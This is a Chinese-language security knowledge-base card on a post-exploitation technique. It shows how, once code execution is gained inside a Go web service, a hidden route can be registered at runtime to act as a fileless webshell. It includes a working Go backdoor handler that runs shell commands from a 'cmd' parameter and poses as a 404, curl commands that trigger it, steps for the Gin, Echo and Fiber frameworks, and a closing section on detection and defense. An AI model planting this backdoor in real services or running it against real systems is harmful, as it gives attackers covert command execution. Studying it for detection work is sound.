---
id: web-golang-http-handler-memshell-runtime-route
title: Go net/http Handler 内存马：RCE 后动态注册隐藏路由实现无文件 WebShell
type: scenario
domain: web
path: web/golang
technique: go-http-handler-memshell
aliases:
- Go 内存马
- net/http 路由劫持
- DefaultServeMux
- http.Handle 后门
- Gin 路由树注入
- 无文件 WebShell
tags:
- go
- golang
- memshell
- net-http
- webshell
- post-exploitation
- no-file
- gin
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V61
  verified_at: '2026-11-05T11:58:42+08:00'
  notes: 已对照原文与图01/02核对：http.ListenAndServe(":8080", nil)→DefaultServeMux；PoC 通过 http.Handle("/.well-known/check", &BackdoorHandler{}) 注册 cmd 路由，正常访问 / 返回 Index Page(图01)，访问 /.well-known/check?cmd=whoami 返回 root 与 id 输出(图02)；卡内已如实指出原文"反射改私有 map"与实际调用公开 http.Handle 不符，并修正原文 main 体内 import "time" 的语法错误。未验证点：文章先在虚构"已有 RCE 可执行 Go 片段"前提下演示，未真正演示向运行中的第三方进程注入 Go 代码/反射改私有 map；Gin/Echo/Fiber 与 Monkey Patching 仅思路无 PoC；PoC 未在本机复跑。该场景最终危害（隐藏路由命令执行）已在图中打通，保留 confidence medium。
---

## 一句话结论

在 Go Web 进程内拿到代码执行后，调用 `http.Handle("/.well-known/check", &BackdoorHandler{})` 就能在运行时向 `http.DefaultServeMux` 注册一个隐藏路由；访问该路径即可执行命令，不开放新端口、不落盘 WebShell、不重启服务，流量仍走业务原生端口，静态查杀与端口/进程排查都难以发现。

## 原理

- `http.ListenAndServe(":8080", nil)` 在 handler 为 nil 时使用 `http.DefaultServeMux`。其内部是一个带读写锁的结构：
  ```go
  type ServeMux struct {
      mu    sync.RWMutex
      m     map[string]muxEntry
      es    []muxEntry
      hosts bool
  }
  ```
  请求进来时按 `m` 中的 pattern 查找 handler。
- `http.Handle(pattern, handler)` 会加锁、检查重复注册，并把 `muxEntry` 写入 `m`。由于服务进程长期运行，这条路由会一直存在，直到进程重启。
- 因此攻击者只需在进程内执行一段 Go 代码（例如通过 RCE、`plugin` 动态加载、不安全的动态执行/反序列化），定义一个 `ServeHTTP` 里执行命令的 handler，再调用 `http.Handle` 注册一个伪装路径（如 `/.well-known/check`）即可。
- 文章提到"直接改写私有 map"与"并发写 map 会 crash"：Go 的 map 不是并发安全的，绕过 `ServeMux.mu` 直接写 `m` 会触发 `fatal error: concurrent map writes`，所以应使用公开的 `http.Handle`（内部持锁），或通过反射拿到 `mu` 后加锁再改；原文 PoC 实际用的是公开 `http.Handle`，并不是真正的"反射改私有 map"。
- 隐藏性：handler 在没传 `cmd` 时返回 404，与正常不存在的路径表现一致；不新增监听端口、不写文件、不重启进程，所以 `ss`/`netstat`、文件查杀、进程重启类排查都看不到。
- 为什么成立：Go 的"静态编译、无容器"只意味着没有 JSP/PHP 那种容器层，但运行时仍然是可变的 Go 进程；只要攻击者能执行 Go 代码，就能调用标准库的注册接口改变路由表。

## 触发条件

- 已获得目标 Go 进程内的代码执行能力（RCE、插件加载、动态脚本/表达式执行、反序列化等）。
- 目标使用 `net/http` 的 `DefaultServeMux`，或能拿到第三方框架（Gin/Echo/Fiber）的 Engine 指针。
- 进程未被重启，路由表未被周期性审计/比对。
- 攻击者能访问业务端口并知道注入的路径。

## 利用步骤

1. 确认目标为 Go Web 服务（`Server` 头、错误页、二进制特征、`/debug/pprof` 等）。
2. 通过 RCE 在进程内执行 Go 代码，定义恶意 handler：读取 `cmd` 参数并 `exec.Command("bash","-c",cmd)`，无参数时返回 404。
3. 调用 `http.Handle("/.well-known/check", &BackdoorHandler{})` 注册隐藏路由。
4. 访问 `http://target:8080/.well-known/check?cmd=whoami` 验证命令执行。
5. 对 Gin/Echo/Fiber：拿到 `*gin.Engine` 等实例指针后调用 `engine.GET(...)`/`AddRoute`，或直接操作其路由树（基数树）插入 handler。
6. 清理：Go 标准库没有删除路由的公开 API；持久化依赖进程不重启，重启即失效。

## PoC

```go
package main

import (
    "fmt"
    "net/http"
    "os/exec"
    "time"
)

type BackdoorHandler struct{}

func (h *BackdoorHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    if cmd != "" {
        out, _ := exec.Command("bash", "-c", cmd).CombinedOutput()
        fmt.Fprintf(w, "%s", out)
        return
    }
    w.WriteHeader(http.StatusNotFound) // 无参数时伪装 404
}

func InjectMemShell() {
    path := "/.well-known/check" // 伪装成正常路径
    http.Handle(path, &BackdoorHandler{})
    fmt.Printf("[+] 内存马已注入: %s\n", path)
}

func main() {
    go func() {
        http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
            w.Write([]byte("Index Page"))
        })
        http.ListenAndServe(":8080", nil)
    }()

    time.Sleep(1 * time.Second) // 等业务路由注册完成
    InjectMemShell()
    select {}
}
```

```bash
# 正常业务
curl http://localhost:8080/
# Index Page

# 触发内存马
curl 'http://localhost:8080/.well-known/check?cmd=whoami'
# root
```

说明：原文 PoC 在 `main` 函数体内写了 `import "time"`，属于语法错误；上例已修正为文件级 import。原文还声称"通过反射改私有 map"，但实际调用的是公开 `http.Handle`，卡内已按实际行为描述。PoC 未在本机执行。

## 变体与关联

- 变体：Gin 的 `Engine` 持有路由树（基数树），拿到指针后可 `engine.GET("/x", handler)` 或直接改 `trees`；Echo/Fiber 同理。
- 变体：Monkey Patching（运行时改函数指针/指令）、劫持 `html/template` 函数表、通过 `plugin` 加载恶意 `.so`，都可达到类似的无文件后门效果。
- 变体：不调用 `http.Handle` 而通过反射拿 `DefaultServeMux.m` 与 `mu`，在持锁的情况下直接写 map，可绕过"重复注册"检查。
- 关联：[[web-golang-servemux-encoded-slash-path-traversal]]（同属 net/http ServeMux 的路由语义问题）；[[web-java-component-tomcat-dynamic-filter-memshell]]（Java 侧内存马对照）。
- 边界：进程重启后路由丢失；无法在进程内执行 Go 代码；目标使用独立的自研路由器且拿不到实例指针时，本链不成立。

## 检测与防御

- 检测：运行时导出路由表并与代码/配置中的硬编码路由做 Diff（`pprof`、自定义 introspection、启动时快照 + 周期比对）；发现运行时新增的、代码中不存在的 pattern。
- 检测：WAF/流量侧关注 `?cmd=`、`.well-known/` 等异常路径与命令特征；同一路径首次出现即执行系统命令。
- 防御：修复 RCE 入口（不安全的动态加载/反序列化/插件）；进程以最小权限运行，禁用不必要的 `exec`；对 `plugin` 加载做完整性校验。
- 加固：定期重启/滚动发布可清除内存马；对 Go 进程做运行时完整性监控；限制 `bash`/`sh` 子进程创建；容器内只读文件系统 + 最小权限。

